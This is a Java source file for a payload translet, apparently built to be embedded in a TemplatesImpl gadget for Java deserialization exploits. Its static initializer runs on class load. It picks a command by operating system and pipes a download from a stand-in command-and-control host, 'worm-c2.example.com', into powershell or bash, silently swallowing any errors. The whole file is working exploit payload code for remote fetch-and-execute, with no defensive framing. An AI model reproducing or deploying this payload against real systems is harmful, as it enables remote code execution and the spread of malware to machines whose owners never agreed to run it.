// Payload translet — compiled and embedded into TemplatesImpl gadget.
// Executes command in static initializer.
package payloads;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class PayloadTranslet extends AbstractTranslet {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String os = System.getProperty("os.name").toLowerCase();
            String[] cmd;
            if (os.contains("win")) {
                cmd = new String[]{"cmd.exe", "/c", "curl -s http://worm-c2.example.com/payload | powershell -"};
            } else {
                cmd = new String[]{"/bin/sh", "-c", "curl -s http://worm-c2.example.com/payload | bash"};
            }
            rt.exec(cmd);
        } catch (Exception e) {
            // Swallow — runs in static init context
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}
